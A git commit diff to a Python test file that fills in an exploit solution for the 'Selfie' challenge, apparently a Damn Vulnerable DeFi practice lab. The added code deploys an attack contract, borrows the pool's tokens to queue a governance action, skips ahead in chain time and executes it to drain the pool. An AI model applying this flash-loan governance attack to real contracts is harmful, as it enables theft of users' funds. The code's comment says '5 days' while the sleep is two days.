7420a2bfb243b6a4533acfb94857bb48c9a852d1
sidarth16 <ssidarth1999@gmail.com>
2022-07-06 09:15:28 +0530

    test exploit updated

--- tests/selfie/test_selfie_challenge.py
+++ tests/selfie/test_selfie_challenge.py
@@ -10,6 +10,8 @@ deployer, attacker = None, None
 TOKEN_INITIAL_SUPPLY = Wei('2_000_000 ether')
 TOKENS_IN_POOL = Wei('1500000 ether')  
 
+print('[Challenge] Selfie :')
+
 #--  [ SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE ] --#
 @pytest.fixture(scope="module")
 def contracts():
@@ -44,5 +46,16 @@ def contracts():
 
 def test_selfie_challenge(contracts):
     #-- [ CODE YOUR EXPLOIT HERE ] ---#
-    pass
+
+    attackSelfie = AttackSelfiePool.deploy(
+        contracts['token'].address, contracts['pool'].address, contracts['governance'].address,
+        {"from":attacker})
+
+    tx = attackSelfie.attack(TOKENS_IN_POOL, {"from":attacker})
+    id = tx.return_value
+
+    chain.sleep(2 * 24 * 60 * 60)  # 5 days
+
+    contracts['governance'].executeAction(id, {"from":attacker})
+
     #_________________________________#
